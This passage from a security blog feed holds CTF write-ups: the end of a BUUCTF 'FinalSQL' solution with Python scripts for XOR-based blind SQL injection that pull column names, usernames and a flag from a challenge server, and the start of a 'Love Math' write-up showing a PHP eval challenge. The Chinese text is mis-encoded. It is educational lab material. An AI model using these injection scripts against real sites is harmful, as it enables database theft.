class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>                true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">F1naI1yçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—:id,username,password<br>&#123;&#x27;F1naI1yçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—&#x27;: &#x27;id,username,password                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äº”æ­¥ï¼šçˆ†å­—æ®µçš„æ•°æ®:</p><p>çˆ†usernameçš„æ•°æ®:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828134250862-1693214990370-12.png" alt="image-20230828134250862"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">100</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">usernameå­—æ®µç¬¬1åˆ—çš„å€¼:mygod,welcome,site,site,site,site,Syc,finally,flag<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªflag,çŒœæµ‹flagåœ¨username&#x3D;flagæ‰€å¯¹åº”çš„å­—æ®µpasswordä¸­</p><p>çˆ†passwordå­—æ®µçš„å€¼ï¼ŒæŒ‡å®šusername&#x3D;flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">passwordå­—æ®µç¬¬1åˆ—çš„å€¼:flag&#123;0ca992a6-fc81-43d7-8419-deba5dea5107&#125;<br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{0ca992a6-fc81-43d7-8419-deba5dea5107}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN 2019 åˆèµ›]Love Math é¢˜è§£</title>
    <link href="/2023/08/24/2023-08-24-Love%20Math/"/>
    <url>/2023/08/24/2023-08-24-Love%20Math/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>1.æ‰“å¼€ç½‘é¡µå‘ç°æ˜¯PHPä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>2.ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 